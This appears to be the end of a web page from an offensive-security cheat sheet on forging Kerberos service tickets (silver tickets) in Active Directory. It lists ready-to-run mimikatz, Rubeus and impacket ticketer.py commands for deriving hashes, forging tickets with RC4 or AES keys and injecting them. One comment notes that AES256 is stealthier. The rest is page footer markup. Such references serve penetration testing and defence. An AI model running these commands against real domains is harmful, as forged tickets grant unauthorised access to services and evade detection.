<h3 id="generate-the-rc4-hash-from-password">Generate the RC4 hash from password</h3>
<pre><code>&gt; mimikatz.exe
&gt; kerberos::hash /password:MyPassword
</code></pre>
<h3 id="mimikatz_2">Mimikatz</h3>
<pre><code class="language-powershell"># To generate the TGS with NTLM
&gt; kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# To generate the TGS with AES 128 key
&gt; kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
&gt; kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt; 

# Inject TGS with Mimikatz
&gt; kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<h3 id="rubeus_1">Rubeus</h3>
<pre><code>&gt; .\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<h3 id="remote_1">Remote</h3>
<pre><code class="language-bash">$ ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN &lt;USER&gt;

# To generate the TGS with NTLM
$ python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# To generate the TGS with AES key
$ python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# Set the ticket for impacket use
$ export KRB5CCNAME=&lt;TGS_ccache_file&gt;
</code></pre>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.56dfad97.min.js"></script>
      
    
  </body>
</html>